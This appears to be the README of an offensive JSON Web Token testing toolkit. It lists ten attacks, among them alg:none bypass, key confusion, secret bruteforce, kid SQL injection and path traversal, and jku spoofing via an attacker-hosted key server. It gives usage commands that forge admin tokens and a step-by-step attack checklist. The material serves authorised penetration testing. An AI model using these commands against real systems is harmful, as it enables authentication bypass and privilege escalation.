# JWT Attack Suite

> Offensive JWT testing toolkit for penetration testers and bug bounty hunters.

A comprehensive CLI tool covering every major JWT attack vector — from `alg:none` to RS256→HS256 confusion, weak secret bruteforce, `kid` injection, `jku`/`x5u` spoofing, and full token forgery.

---

## Attacks Covered

| # | Attack | Description |
|---|--------|-------------|
| 1 | `none` | `alg:none` bypass — all case/variant permutations |
| 2 | `confusion` | RS256 → HS256 algorithm confusion with RSA public key |
| 3 | `bruteforce` | Weak HMAC secret cracking (HS256/384/512), multithreaded |
| 4 | `kid` | `kid` header SQL injection + path traversal (`/dev/null`) |
| 5 | `jku` | `jku` header spoofing — host your own JWKS server |
| 6 | `x5u` | `x5u` header spoofing — host your own X.509 cert |
| 7 | `forge` | Arbitrary token forgery with known secret |
| 8 | `privesc` | Auto-generate common privilege escalation token variants |
| 9 | `embedded` | Embedded JWK attack (CVE-2018-0114 style) |
| 10 | `decode` | Decode and pretty-print token claims |

---

## Installation

```bash
git clone https://github.com/yourhandle/jwt-attack-suite
cd jwt-attack-suite
pip install -r requirements.txt
chmod +x jwt_attack.py
```

---

## Usage

### Decode a token
```bash
python3 jwt_attack.py decode -t eyJhbGciOiJIUzI1NiJ9...
```

### alg:none bypass
```bash
# Basic
python3 jwt_attack.py none -t <token>

# With claim injection
python3 jwt_attack.py none -t <token> --claims '{"role":"admin","sub":"1"}'
```

### RS256 → HS256 Algorithm Confusion
```bash
# With local public key file
python3 jwt_attack.py confusion -t <token> --pubkey server_public.pem --claims '{"role":"admin"}'

# Auto-fetch from JWKS endpoint
python3 jwt_attack.py confusion -t <token> --jwks https://target.com/.well-known/jwks.json
```

### Weak Secret Bruteforce
```bash
# Built-in quick wordlist
python3 jwt_attack.py bruteforce -t <token>

# Custom wordlist (rockyou, jwt-secrets, etc.)
python3 jwt_attack.py bruteforce -t <token> -w /usr/share/wordlists/rockyou.txt --threads 16

# If secret found, auto-forge with claims
python3 jwt_attack.py bruteforce -t <token> -w wordlist.txt --claims '{"admin":true}'
```

### kid Header Injection
```bash
# All injection types (SQLi + path traversal)
python3 jwt_attack.py kid -t <token> --claims '{"role":"admin"}'

# Only SQLi payloads
python3 jwt_attack.py kid -t <token> --kid-type sqli

# Only path traversal
python3 jwt_attack.py kid -t <token> --kid-type path

# Custom kid value
python3 jwt_attack.py kid -t <token> --custom-kid "../../dev/null" --custom-secret ""
```

### jku Header Spoofing
```bash
# Point server to your JWKS (you need to host it)
python3 jwt_attack.py jku -t <token> --attacker-url http://YOUR_IP:8888/jwks.json --claims '{"admin":true}'

# Auto-spin up local JWKS server
python3 jwt_attack.py jku -t <token> --attacker-url http://YOUR_IP:8888/jwks.json --serve --port 8888
```

### Token Forgery (known secret)
```bash
python3 jwt_attack.py forge -t <token> --secret "mysecret" --claims '{"role":"admin","sub":"0"}'

# With extended expiry (1 year)
python3 jwt_attack.py forge -t <token> --secret "mysecret" --claims '{"role":"admin"}' --extend-exp 31536000
```

### Privilege Escalation Auto-Payloads
```bash
python3 jwt_attack.py privesc -t <token> --secret "mysecret"
```

### Embedded JWK Attack
```bash
python3 jwt_attack.py embedded -t <token> --claims '{"role":"admin"}'
```

### Run All Attacks
```bash
python3 jwt_attack.py all -t <token> --claims '{"role":"admin"}' -w wordlist.txt -o results.json
```

### Save Results
```bash
python3 jwt_attack.py bruteforce -t <token> -w rockyou.txt -o output.json
```

---

## Real-World Attack Flow

### Bug Bounty JWT Testing Checklist

```
1. Decode the token — check alg, claims, kid, jku fields
   → python3 jwt_attack.py decode -t TOKEN

2. Try alg:none
   → python3 jwt_attack.py none -t TOKEN --claims '{"role":"admin"}'

3. Check if alg is RS256 — grab public key from /jwks.json, /.well-known/jwks.json
   → python3 jwt_attack.py confusion -t TOKEN --jwks https://target.com/.well-known/jwks.json

4. Bruteforce HS256 secret
   → python3 jwt_attack.py bruteforce -t TOKEN -w jwt-secrets.txt

5. Check for kid header — try injection
   → python3 jwt_attack.py kid -t TOKEN --claims '{"role":"admin"}'

6. Check for jku/x5u — test if server fetches it
   → python3 jwt_attack.py jku -t TOKEN --attacker-url http://COLLAB/jwks.json --serve
```

---

## Good JWT Secret Wordlists

- `jwt-secrets.txt` — [wallarm/jwt-secrets](https://github.com/wallarm/jwt-secrets)
- `/usr/share/wordlists/rockyou.txt`
- [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) — Passwords/Common-Credentials/

---

## Related CVEs / Research

- [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) — alg:none in node-jsonwebtoken
- [CVE-2016-10555](https://nvd.nist.gov/vuln/detail/CVE-2016-10555) — RS/HS confusion
- [CVE-2018-0114](https://nvd.nist.gov/vuln/detail/CVE-2018-0114) — Embedded JWK attack
- [PortSwigger JWT Labs](https://portswigger.net/web-security/jwt) — Practice environment

---

## Legal

For authorized penetration testing and bug bounty programs only.
Do not use against systems you do not have explicit written permission to test.

---

## License

MIT
